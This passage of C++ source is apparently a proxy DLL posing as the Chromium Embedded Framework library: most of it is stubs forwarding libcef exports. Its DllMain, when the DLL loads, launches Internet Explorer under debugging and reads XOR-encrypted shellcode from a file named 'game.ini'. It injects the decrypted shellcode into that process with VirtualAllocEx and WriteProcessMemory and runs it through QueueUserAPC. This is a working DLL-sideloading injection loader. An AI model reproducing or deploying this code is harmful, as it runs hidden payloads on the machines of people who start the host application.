PVOID pfnAheadLibEx_cef_translator_test_object_child_create;
PVOID pfnAheadLibEx_cef_translator_test_object_create;
PVOID pfnAheadLibEx_cef_unregister_internal_web_plugin;
PVOID pfnAheadLibEx_cef_uridecode;
PVOID pfnAheadLibEx_cef_uriencode;
PVOID pfnAheadLibEx_cef_urlrequest_create;
PVOID pfnAheadLibEx_cef_v8context_get_current_context;
PVOID pfnAheadLibEx_cef_v8context_get_entered_context;
PVOID pfnAheadLibEx_cef_v8context_in_context;
PVOID pfnAheadLibEx_cef_v8stack_trace_get_current;
PVOID pfnAheadLibEx_cef_v8value_create_array;
PVOID pfnAheadLibEx_cef_v8value_create_bool;
PVOID pfnAheadLibEx_cef_v8value_create_date;
PVOID pfnAheadLibEx_cef_v8value_create_double;
PVOID pfnAheadLibEx_cef_v8value_create_function;
PVOID pfnAheadLibEx_cef_v8value_create_int;
PVOID pfnAheadLibEx_cef_v8value_create_null;
PVOID pfnAheadLibEx_cef_v8value_create_object;
PVOID pfnAheadLibEx_cef_v8value_create_string;
PVOID pfnAheadLibEx_cef_v8value_create_uint;
PVOID pfnAheadLibEx_cef_v8value_create_undefined;
PVOID pfnAheadLibEx_cef_value_create;
PVOID pfnAheadLibEx_cef_version_info;
PVOID pfnAheadLibEx_cef_visit_web_plugin_info;
PVOID pfnAheadLibEx_cef_window_create_top_level;
PVOID pfnAheadLibEx_cef_write_json;
PVOID pfnAheadLibEx_cef_xml_reader_create;
PVOID pfnAheadLibEx_cef_zip_reader_create;


static HMODULE g_OldModule = NULL;

VOID WINAPI Free()
{
	if (g_OldModule)
	{
		FreeLibrary(g_OldModule);
	}
}

std::tuple<DWORD, HANDLE, HANDLE> CreateProcessAndStop(const std::string& lpProcessName) {
	std::string lpPath =  lpProcessName;
	//std::cout << "\n\t[i] Running: \"" << lpPath << "\" ... ";
	STARTUPINFOA Si = { sizeof(STARTUPINFOA) };
	PROCESS_INFORMATION Pi = { 0 };

	if (!CreateProcessA(NULL, (LPSTR)(lpPath.data()), NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
		//std::cerr << "[!] CreateProcessA Failed with Error : " << GetLastError() << std::endl;
		return { 0, INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE };
	}
	//std::cout << "[+] DONE" << std::endl;
	return { Pi.dwProcessId, Pi.hProcess, Pi.hThread };
}

std::tuple<BOOL, PVOID> InjectShellcode(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
	SIZE_T sNumberOfBytesWritten = NULL;
	PVOID pAddress = nullptr;
	pAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		//std::cerr << "\n\t[!] VirtualAllocEx Failed With Error : " << GetLastError() << std::endl;
		return std::make_tuple(FALSE, nullptr);
	}
	//std::cout << "\n\t[i] Allocated Memory At : 0x" << pAddress << std::endl;
	//std::cout << "\t[#] Press <Enter> To Write Payload ... ";
	if (!WriteProcessMemory(hProcess, pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		//std::cerr << "\n\t[!] WriteProcessMemory Failed With Error : " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
		return std::make_tuple(FALSE, nullptr);
	}
	//std::cout << "\t[i] Successfully Written " << sNumberOfBytesWritten << " Bytes" << std::endl;

	DWORD dwOldProtection = NULL;
	if (!VirtualProtectEx(hProcess, pAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
		//std::cerr << "\n\t[!] VirtualProtectEx Failed With Error : " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
		return std::make_tuple(FALSE, nullptr);
	}

	return std::make_tuple(TRUE, pAddress);
}

void XorByInputKey(std::vector<unsigned char>& shellcode, const std::string& key) {
	size_t shellcodeSize = shellcode.size();
	size_t keySize = key.size();

	for (size_t i = 0, j = 0; i < shellcodeSize; i++, j++) {
		if (j >= keySize) {
			j = 0;
		}
		shellcode[i] = shellcode[i] ^ key[j];
	}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hModule);
		//MessageBox(NULL, L"Hello World", L"Hello", MB_OK);
		
		auto [PId, hProcess, hThread] = CreateProcessAndStop("C:\\Program Files \\Internet Explorer\\iexplore.exe");

		std::string key = "yuzusoft";
		std::ifstream file("game.ini", std::ios::binary);
		std::vector<unsigned char> shellcode;

		if (file) {
			file.seekg(0, std::ios::end);
			size_t size = file.tellg();
			shellcode.resize(size);

			file.seekg(0, std::ios::beg);
			file.read(reinterpret_cast<char*>(shellcode.data()), size);
			file.close();
		}
		//WaitForInputIdle(hProcess, 10000);
		WaitForSingleObject(GetCurrentThread(), 10000);

		XorByInputKey(shellcode, key);

		auto [if_success, pAddress] = InjectShellcode(hProcess, shellcode.data(), shellcode.size());
		if (!if_success) {
			//MessageBox(NULL, L"InjectShellcode fail", L"Hello", MB_OK);
		}
		//	running QueueUserAPC
		QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL);

		//	since 'CreateSuspendedProcess2' create a process in debug mode,
		//	we need to 'Detach' to resume execution; we do using `DebugActiveProcessStop`   

		DebugActiveProcessStop(PId);

		CloseHandle(hProcess);
		CloseHandle(hThread);

	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
		Free();
	}
	return TRUE;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_ClearBreakpadPipeEnvironmentVariable(void)
{
	__asm jmp pfnAheadLibEx_ClearBreakpadPipeEnvironmentVariable;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_ClearCrashKeyValueImpl(void)
{
	__asm jmp pfnAheadLibEx_ClearCrashKeyValueImpl;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_CrashForException(void)
{
	__asm jmp pfnAheadLibEx_CrashForException;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_DumpProcess(void)
{
	__asm jmp pfnAheadLibEx_DumpProcess;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_DumpProcessWithoutCrash(void)
{
	__asm jmp pfnAheadLibEx_DumpProcessWithoutCrash;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_GetHandleVerifier(void)
{
	__asm jmp pfnAheadLibEx_GetHandleVerifier;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_InjectDumpForHangDebugging(void)
{
	__asm jmp pfnAheadLibEx_InjectDumpForHangDebugging;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_InjectDumpProcessWithoutCrash(void)
{
	__asm jmp pfnAheadLibEx_InjectDumpProcessWithoutCrash;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_IsSandboxedProcess(void)
{
	__asm jmp pfnAheadLibEx_IsSandboxedProcess;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_RelaunchChromeBrowserWithNewCommandLineIfNeeded(void)
{
	__asm jmp pfnAheadLibEx_RelaunchChromeBrowserWithNewCommandLineIfNeeded;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_SetCrashKeyValueImpl(void)
{
	__asm jmp pfnAheadLibEx_SetCrashKeyValueImpl;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_TerminateProcessWithoutDump(void)
{
	__asm jmp pfnAheadLibEx_TerminateProcessWithoutDump;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_add_cross_origin_whitelist_entry(void)
{
	__asm jmp pfnAheadLibEx_cef_add_cross_origin_whitelist_entry;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_api_hash(void)
{
	__asm jmp pfnAheadLibEx_cef_api_hash;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_base64decode(void)
{
	__asm jmp pfnAheadLibEx_cef_base64decode;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_base64encode(void)
{
	__asm jmp pfnAheadLibEx_cef_base64encode;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_begin_tracing(void)
{
	__asm jmp pfnAheadLibEx_cef_begin_tracing;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_binary_value_create(void)
{
	__asm jmp pfnAheadLibEx_cef_binary_value_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_browser_host_create_browser(void)
{
	__asm jmp pfnAheadLibEx_cef_browser_host_create_browser;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_browser_host_create_browser_sync(void)
{
	__asm jmp pfnAheadLibEx_cef_browser_host_create_browser_sync;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_browser_view_create(void)
{
	__asm jmp pfnAheadLibEx_cef_browser_view_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_browser_view_get_for_browser(void)
{
	__asm jmp pfnAheadLibEx_cef_browser_view_get_for_browser;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_clear_cross_origin_whitelist(void)
{
	__asm jmp pfnAheadLibEx_cef_clear_cross_origin_whitelist;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_clear_scheme_handler_factories(void)
{
	__asm jmp pfnAheadLibEx_cef_clear_scheme_handler_factories;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_command_line_create(void)
{
	__asm jmp pfnAheadLibEx_cef_command_line_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_command_line_get_global(void)
{
	__asm jmp pfnAheadLibEx_cef_command_line_get_global;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_cookie_manager_create_manager(void)
{
	__asm jmp pfnAheadLibEx_cef_cookie_manager_create_manager;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_cookie_manager_get_global_manager(void)
{
	__asm jmp pfnAheadLibEx_cef_cookie_manager_get_global_manager;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_create_context_shared(void)
{
	__asm jmp pfnAheadLibEx_cef_create_context_shared;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_create_url(void)
{
	__asm jmp pfnAheadLibEx_cef_create_url;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_currently_on(void)
{
	__asm jmp pfnAheadLibEx_cef_currently_on;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_dictionary_value_create(void)
{
	__asm jmp pfnAheadLibEx_cef_dictionary_value_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_display_get_alls(void)
{
	__asm jmp pfnAheadLibEx_cef_display_get_alls;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_display_get_count(void)
{
	__asm jmp pfnAheadLibEx_cef_display_get_count;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_display_get_matching_bounds(void)
{
	__asm jmp pfnAheadLibEx_cef_display_get_matching_bounds;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_display_get_nearest_point(void)
{
	__asm jmp pfnAheadLibEx_cef_display_get_nearest_point;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_display_get_primary(void)
{
	__asm jmp pfnAheadLibEx_cef_display_get_primary;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_do_message_loop_work(void)
{
	__asm jmp pfnAheadLibEx_cef_do_message_loop_work;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_drag_data_create(void)
{
	__asm jmp pfnAheadLibEx_cef_drag_data_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_enable_highdpi_support(void)
{
	__asm jmp pfnAheadLibEx_cef_enable_highdpi_support;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_end_tracing(void)
{
	__asm jmp pfnAheadLibEx_cef_end_tracing;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_execute_process(void)
{
	__asm jmp pfnAheadLibEx_cef_execute_process;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_format_url_for_security_display(void)
{
	__asm jmp pfnAheadLibEx_cef_format_url_for_security_display;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_get_current_platform_thread_handle(void)
{
	__asm jmp pfnAheadLibEx_cef_get_current_platform_thread_handle;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_get_current_platform_thread_id(void)
{
	__asm jmp pfnAheadLibEx_cef_get_current_platform_thread_id;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_get_extensions_for_mime_type(void)
{
	__asm jmp pfnAheadLibEx_cef_get_extensions_for_mime_type;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_get_geolocation(void)
{
	__asm jmp pfnAheadLibEx_cef_get_geolocation;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_get_mime_type(void)
{
	__asm jmp pfnAheadLibEx_cef_get_mime_type;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_get_min_log_level(void)
{
	__asm jmp pfnAheadLibEx_cef_get_min_log_level;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_get_path(void)
{
	__asm jmp pfnAheadLibEx_cef_get_path;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_get_vlog_level(void)
{
	__asm jmp pfnAheadLibEx_cef_get_vlog_level;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_image_create(void)
{
	__asm jmp pfnAheadLibEx_cef_image_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_initialize(void)
{
	__asm jmp pfnAheadLibEx_cef_initialize;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_is_cert_status_error(void)
{
	__asm jmp pfnAheadLibEx_cef_is_cert_status_error;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_is_cert_status_minor_error(void)
{
	__asm jmp pfnAheadLibEx_cef_is_cert_status_minor_error;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_is_web_plugin_unstable(void)
{
	__asm jmp pfnAheadLibEx_cef_is_web_plugin_unstable;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_label_button_create(void)
{
	__asm jmp pfnAheadLibEx_cef_label_button_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_launch_process(void)
{
	__asm jmp pfnAheadLibEx_cef_launch_process;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_list_value_create(void)
{
	__asm jmp pfnAheadLibEx_cef_list_value_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_log(void)
{
	__asm jmp pfnAheadLibEx_cef_log;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_menu_button_create(void)
{
	__asm jmp pfnAheadLibEx_cef_menu_button_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_menu_model_create(void)
{
	__asm jmp pfnAheadLibEx_cef_menu_model_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_now_from_system_trace_time(void)
{
	__asm jmp pfnAheadLibEx_cef_now_from_system_trace_time;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_panel_create(void)
{
	__asm jmp pfnAheadLibEx_cef_panel_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_parse_json(void)
{
	__asm jmp pfnAheadLibEx_cef_parse_json;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_parse_jsonand_return_error(void)
{
	__asm jmp pfnAheadLibEx_cef_parse_jsonand_return_error;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_parse_url(void)
{
	__asm jmp pfnAheadLibEx_cef_parse_url;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_post_data_create(void)
{
	__asm jmp pfnAheadLibEx_cef_post_data_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_post_data_element_create(void)
{
	__asm jmp pfnAheadLibEx_cef_post_data_element_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_post_delayed_task(void)
{
	__asm jmp pfnAheadLibEx_cef_post_delayed_task;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_post_task(void)
{
	__asm jmp pfnAheadLibEx_cef_post_task;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_print_settings_create(void)
{
	__asm jmp pfnAheadLibEx_cef_print_settings_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_process_message_create(void)
{
	__asm jmp pfnAheadLibEx_cef_process_message_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_quit_message_loop(void)
{
	__asm jmp pfnAheadLibEx_cef_quit_message_loop;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_refresh_web_plugins(void)
{
	__asm jmp pfnAheadLibEx_cef_refresh_web_plugins;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_register_extension(void)
{
	__asm jmp pfnAheadLibEx_cef_register_extension;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_register_scheme_handler_factory(void)
{
	__asm jmp pfnAheadLibEx_cef_register_scheme_handler_factory;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_register_web_plugin_crash(void)
{
	__asm jmp pfnAheadLibEx_cef_register_web_plugin_crash;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_register_widevine_cdm(void)
{
	__asm jmp pfnAheadLibEx_cef_register_widevine_cdm;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_remove_cross_origin_whitelist_entry(void)
{
	__asm jmp pfnAheadLibEx_cef_remove_cross_origin_whitelist_entry;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_request_context_create_context(void)
{
	__asm jmp pfnAheadLibEx_cef_request_context_create_context;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_request_context_get_global_context(void)
{
	__asm jmp pfnAheadLibEx_cef_request_context_get_global_context;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_request_create(void)
{
	__asm jmp pfnAheadLibEx_cef_request_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_resource_bundle_get_global(void)
{
	__asm jmp pfnAheadLibEx_cef_resource_bundle_get_global;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_response_create(void)
{
	__asm jmp pfnAheadLibEx_cef_response_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_run_message_loop(void)
{
	__asm jmp pfnAheadLibEx_cef_run_message_loop;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_scroll_view_create(void)
{
	__asm jmp pfnAheadLibEx_cef_scroll_view_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_set_osmodal_loop(void)
{
	__asm jmp pfnAheadLibEx_cef_set_osmodal_loop;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_shutdown(void)
{
	__asm jmp pfnAheadLibEx_cef_shutdown;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_stream_reader_create_for_data(void)
{
	__asm jmp pfnAheadLibEx_cef_stream_reader_create_for_data;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_stream_reader_create_for_file(void)
{
	__asm jmp pfnAheadLibEx_cef_stream_reader_create_for_file;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_stream_reader_create_for_handler(void)
{
	__asm jmp pfnAheadLibEx_cef_stream_reader_create_for_handler;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_stream_writer_create_for_file(void)
{
	__asm jmp pfnAheadLibEx_cef_stream_writer_create_for_file;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_stream_writer_create_for_handler(void)
{
	__asm jmp pfnAheadLibEx_cef_stream_writer_create_for_handler;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_ascii_to_utf16(void)
{
	__asm jmp pfnAheadLibEx_cef_string_ascii_to_utf16;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_ascii_to_wide(void)
{
	__asm jmp pfnAheadLibEx_cef_string_ascii_to_wide;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_list_alloc(void)
{
	__asm jmp pfnAheadLibEx_cef_string_list_alloc;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_list_append(void)
{
	__asm jmp pfnAheadLibEx_cef_string_list_append;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_list_clear(void)
{
	__asm jmp pfnAheadLibEx_cef_string_list_clear;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_list_copy(void)
{
	__asm jmp pfnAheadLibEx_cef_string_list_copy;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_list_free(void)
{
	__asm jmp pfnAheadLibEx_cef_string_list_free;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_list_size(void)
{
	__asm jmp pfnAheadLibEx_cef_string_list_size;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_list_value(void)
{
	__asm jmp pfnAheadLibEx_cef_string_list_value;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_map_alloc(void)
{
	__asm jmp pfnAheadLibEx_cef_string_map_alloc;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_map_append(void)
{
	__asm jmp pfnAheadLibEx_cef_string_map_append;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_map_clear(void)
{
	__asm jmp pfnAheadLibEx_cef_string_map_clear;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_map_find(void)
{
	__asm jmp pfnAheadLibEx_cef_string_map_find;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_map_free(void)
{
	__asm jmp pfnAheadLibEx_cef_string_map_free;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_map_key(void)
{
	__asm jmp pfnAheadLibEx_cef_string_map_key;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_map_size(void)
{
	__asm jmp pfnAheadLibEx_cef_string_map_size;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_map_value(void)
{
	__asm jmp pfnAheadLibEx_cef_string_map_value;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_multimap_alloc(void)
{
	__asm jmp pfnAheadLibEx_cef_string_multimap_alloc;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_multimap_append(void)
{
	__asm jmp pfnAheadLibEx_cef_string_multimap_append;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_multimap_clear(void)
{
	__asm jmp pfnAheadLibEx_cef_string_multimap_clear;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_multimap_enumerate(void)
{
	__asm jmp pfnAheadLibEx_cef_string_multimap_enumerate;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_multimap_find_count(void)
{
	__asm jmp pfnAheadLibEx_cef_string_multimap_find_count;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_multimap_free(void)
{
	__asm jmp pfnAheadLibEx_cef_string_multimap_free;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_multimap_key(void)
{
	__asm jmp pfnAheadLibEx_cef_string_multimap_key;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_multimap_size(void)
{
	__asm jmp pfnAheadLibEx_cef_string_multimap_size;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_multimap_value(void)
{
	__asm jmp pfnAheadLibEx_cef_string_multimap_value;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_userfree_utf16_alloc(void)
{
	__asm jmp pfnAheadLibEx_cef_string_userfree_utf16_alloc;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_userfree_utf16_free(void)
{
	__asm jmp pfnAheadLibEx_cef_string_userfree_utf16_free;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_userfree_utf8_alloc(void)
{
	__asm jmp pfnAheadLibEx_cef_string_userfree_utf8_alloc;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_userfree_utf8_free(void)
{
	__asm jmp pfnAheadLibEx_cef_string_userfree_utf8_free;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_userfree_wide_alloc(void)
{
	__asm jmp pfnAheadLibEx_cef_string_userfree_wide_alloc;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_userfree_wide_free(void)
{
	__asm jmp pfnAheadLibEx_cef_string_userfree_wide_free;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_utf16_clear(void)
{
	__asm jmp pfnAheadLibEx_cef_string_utf16_clear;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_utf16_cmp(void)
{
	__asm jmp pfnAheadLibEx_cef_string_utf16_cmp;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_utf16_set(void)
{
	__asm jmp pfnAheadLibEx_cef_string_utf16_set;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_utf16_to_utf8(void)
{
	__asm jmp pfnAheadLibEx_cef_string_utf16_to_utf8;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_utf16_to_wide(void)
{
	__asm jmp pfnAheadLibEx_cef_string_utf16_to_wide;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_utf8_clear(void)
{
	__asm jmp pfnAheadLibEx_cef_string_utf8_clear;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_utf8_cmp(void)
{
	__asm jmp pfnAheadLibEx_cef_string_utf8_cmp;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_utf8_set(void)
{
	__asm jmp pfnAheadLibEx_cef_string_utf8_set;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_utf8_to_utf16(void)
{
	__asm jmp pfnAheadLibEx_cef_string_utf8_to_utf16;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_utf8_to_wide(void)
{
	__asm jmp pfnAheadLibEx_cef_string_utf8_to_wide;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_wide_clear(void)
{
	__asm jmp pfnAheadLibEx_cef_string_wide_clear;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_wide_cmp(void)
{
	__asm jmp pfnAheadLibEx_cef_string_wide_cmp;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_wide_set(void)
{
	__asm jmp pfnAheadLibEx_cef_string_wide_set;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_wide_to_utf16(void)
{
	__asm jmp pfnAheadLibEx_cef_string_wide_to_utf16;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_string_wide_to_utf8(void)
{
	__asm jmp pfnAheadLibEx_cef_string_wide_to_utf8;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_task_runner_get_for_current_thread(void)
{
	__asm jmp pfnAheadLibEx_cef_task_runner_get_for_current_thread;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_task_runner_get_for_thread(void)
{
	__asm jmp pfnAheadLibEx_cef_task_runner_get_for_thread;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_textfield_create(void)
{
	__asm jmp pfnAheadLibEx_cef_textfield_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_time_delta(void)
{
	__asm jmp pfnAheadLibEx_cef_time_delta;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_time_from_doublet(void)
{
	__asm jmp pfnAheadLibEx_cef_time_from_doublet;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_time_from_timet(void)
{
	__asm jmp pfnAheadLibEx_cef_time_from_timet;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_time_now(void)
{
	__asm jmp pfnAheadLibEx_cef_time_now;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_time_to_doublet(void)
{
	__asm jmp pfnAheadLibEx_cef_time_to_doublet;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_time_to_timet(void)
{
	__asm jmp pfnAheadLibEx_cef_time_to_timet;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_trace_counter(void)
{
	__asm jmp pfnAheadLibEx_cef_trace_counter;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_trace_counter_id(void)
{
	__asm jmp pfnAheadLibEx_cef_trace_counter_id;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_trace_event_async_begin(void)
{
	__asm jmp pfnAheadLibEx_cef_trace_event_async_begin;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_trace_event_async_end(void)
{
	__asm jmp pfnAheadLibEx_cef_trace_event_async_end;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_trace_event_async_step_into(void)
{
